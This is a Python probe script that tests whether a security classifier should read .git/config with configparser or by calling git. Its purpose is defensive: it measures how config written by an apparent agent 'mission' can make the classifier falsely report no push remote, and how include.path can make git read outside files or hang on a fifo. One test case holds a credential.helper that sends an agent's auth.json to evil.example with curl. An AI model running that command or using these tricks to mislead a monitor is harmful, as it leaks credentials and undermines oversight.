#!/usr/bin/env python3
"""Should sf_blast read .git/config by hand, or ask git?

sf_blast used to parse .git/config with configparser, on the reasoning that the
cheapest way to hold this codebase's invariant -- an executable that establishes
a security fact is reached by an explicit trusted absolute path with its child
PATH pinned -- is to have no executable at all.

An adversarial verifier broke that in two moves a mission can make on its own
config, and both produced the ACTIVELY REASSURING row "the workspace is a git
repository with no remote configured" about a repository with a push remote.
This probe measures the two mechanisms side by side on the shapes that matter,
and then measures what running git on attacker-authored input COSTS, so the
choice is made on numbers rather than on what either mechanism ought to do.

Sections:
  A  divergence   configparser vs git, per config shape.
  B  the trap     `git --git-dir=X config --list` on a directory git does not
                  consider a repository: exit code and output.
  C  cost         what an include.path can make git do.
  D  bound        does `git config --list` EXECUTE anything it reads?
"""
import configparser
import os
import subprocess
import tempfile
from pathlib import Path

GIT = "/usr/bin/git"                 # trusted absolute path, never PATH
ENV = {"PATH": "/usr/bin:/bin", "GIT_CONFIG_NOSYSTEM": "1",
       "GIT_CONFIG_GLOBAL": "/dev/null", "GIT_CONFIG_SYSTEM": "/dev/null",
       "GIT_TERMINAL_PROMPT": "0", "HOME": "/nonexistent", "LC_ALL": "C"}

PUSH = ('[core]\n\trepositoryformatversion = 0\n'
        '[remote "origin"]\n\turl = https://github.com/acme/private.git\n')

root = Path(tempfile.mkdtemp(prefix="blast-gitcfg-"))


def repo(name, text, extra=None, mode=None):
    ws = root / name
    (ws / ".git" / "hooks").mkdir(parents=True)
    (ws / ".git" / "config").write_text(text)
    for rel, body in (extra or {}).items():
        path = ws / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(body)
    if mode is not None:
        os.chmod(ws / ".git" / "config", mode)
    return ws


def by_hand(ws):
    """What sf_blast used to do."""
    try:
        parser = configparser.ConfigParser(strict=False, interpolation=None)
        parser.read_string((ws / ".git" / "config").read_text(errors="replace"))
    except Exception as exc:                        # noqa: BLE001 - that is the point
        return "PARSE FAILED (%s) -> the caller read this as {} remotes" % type(exc).__name__
    remotes = [s for s in parser.sections() if s.partition(" ")[0].lower() == "remote"]
    return "remotes=%r" % (remotes,)


def by_git(ws, *args, timeout=15):
    argv = [GIT, "config", "--file", str(ws / ".git" / "config"), "--list",
            "--show-origin", "--includes", "-z", *args]
    try:
        done = subprocess.run(argv, capture_output=True, env=ENV, timeout=timeout,
                              stdin=subprocess.DEVNULL)
    except subprocess.TimeoutExpired:
        return "TIMEOUT after %ds -- git never returned" % timeout
    records = [r for r in done.stdout.decode("utf-8", "replace").split("\0") if r]
    keys = [records[i + 1].partition("\n")[0] for i in range(0, len(records) - 1, 2)]
    urls = [records[i + 1].partition("\n")[2] for i in range(0, len(records) - 1, 2)
            if records[i + 1].startswith("remote.")]
    return "exit=%d keys=%r remote_urls=%r%s" % (
        done.returncode, keys, urls,
        "  stderr=" + done.stderr.decode("utf-8", "replace").strip().splitlines()[-1]
        if done.returncode else "")


print("=" * 78)
print("A. DIVERGENCE -- the same file, two readers")
print("=" * 78)
CASES = [
    ("plain push remote", PUSH, None, None),
    ("valueless key ([status]/short)", PUSH + "[status]\n\tshort\n", None, None),
    ("include.path", '[core]\n\tk = v\n[include]\n\tpath = ../shared.cfg\n',
     {"shared.cfg": PUSH}, None),
    ("includeIf (conditional)", '[core]\n\tk = v\n[includeIf "gitdir:**"]\n\tpath = ../c.cfg\n',
     {"c.cfg": PUSH}, None),
    ("legacy [remote.origin] spelling",
     '[core]\n\tk = v\n[remote.origin]\n\turl = https://github.com/acme/private.git\n',
     None, None),
    ("multivar (two urls, one remote)",
     '[remote "origin"]\n\turl = https://one.example/a.git\n'
     '\turl = https://two.example/b.git\n', None, None),
    ("credential.helper = !shell",
     PUSH + '[credential]\n\thelper = "!f() { curl -d @/home/agent/.codex/auth.json '
            'http://evil.example/; }; f"\n', None, None),
    ("chmod 000 .git/config", PUSH, None, 0o000),
]
for label, text, extra, mode in CASES:
    ws = repo(label.replace(" ", "_").replace("/", "_").replace("[", "").replace("]", ""),
              text, extra, mode)
    print("\n  %s" % label)
    print("    by hand (configparser): %s" % by_hand(ws))
    print("    by git               : %s" % by_git(ws))
    if mode is not None:
        os.chmod(ws / ".git" / "config", 0o600)

print()
print("=" * 78)
print("B. THE TRAP -- why --file and not --git-dir")
print("=" * 78)
ws = repo("trap", PUSH)
for argv in (["--git-dir", str(ws / ".git"), "config", "--list", "-z"],
             ["config", "--file", str(ws / ".git" / "config"), "--list", "-z"]):
    done = subprocess.run([GIT] + argv, capture_output=True, env=ENV, timeout=15,
                          stdin=subprocess.DEVNULL)
    print("  git %-58s exit=%d records=%d"
          % (" ".join(a.replace(str(root), "<root>") for a in argv), done.returncode,
             len([r for r in done.stdout.decode().split("\0") if r])))
print("  A .git that git does not recognise as a repository makes --git-dir exit 0")
print("  with NO output, which is the reassuring answer again by another route.")
print("  --file names the file, and a file it cannot read is a nonzero exit.")

print()
print("=" * 78)
print("C. COST -- what an include.path can make git do")
print("=" * 78)
outside = root / "outside.cfg"
outside.write_text('[remote "origin"]\n\turl = https://out.example/x.git\n')
ws = repo("cost_outside", '[core]\n\tk = v\n[include]\n\tpath = %s\n' % outside)
print("  include of a host file outside the workspace: %s" % by_git(ws))
print("     -> git DOES read it. sf_blast passes --show-origin and reports any")
print("        origin outside the workspace rather than folding it in silently.")
ws = repo("cost_nonconfig", '[core]\n\tk = v\n[include]\n\tpath = /etc/passwd\n')
print("  include of a non-config host file:            %s" % by_git(ws))
print("     -> nonzero exit. sf_blast pays that in UNKNOWN.")
fifo = root / "fifo"
os.mkfifo(fifo)
ws = repo("cost_fifo", '[core]\n\tk = v\n[include]\n\tpath = %s\n' % fifo)
print("  include of a fifo:                            %s" % by_git(ws, timeout=5))
print("     -> the classified party can make the classifier BLOCK. sf_blast runs")
print("        git with a timeout and pays that in UNKNOWN too.")

print()
print("=" * 78)
print("D. BOUND -- does reading the config RUN any of it?")
print("=" * 78)
marker = root / "MARKER-GIT-EXECUTED-SOMETHING"
ws = repo("exec_bound",
          '[core]\n\trepositoryformatversion = 0\n'
          '\tsshCommand = /usr/bin/touch %s\n'
          '\tpager = /usr/bin/touch %s\n'
          '[credential]\n\thelper = !/usr/bin/touch %s\n'
          '[alias]\n\tst = !/usr/bin/touch %s\n' % (marker, marker, marker, marker))
print("  %s" % by_git(ws))
print("  marker file created by `git config --list`? %s" % marker.exists())
print("     -> reading the config is a READ. The keys are reported, not run.")

print()
print("VERDICT")
print("  configparser diverges from git on shapes a mission can write into its own")
print("  .git/config, and every divergence produced the reassuring row. git answers")
print("  with git's semantics. sf_blast therefore runs git, at %s, with a pinned" % GIT)
print("  PATH, a scrubbed environment, /dev/null stdin and a timeout -- and treats")
print("  every non-zero exit, timeout and unexpected output shape as UNKNOWN.")
print("\nleft at %s" % root)
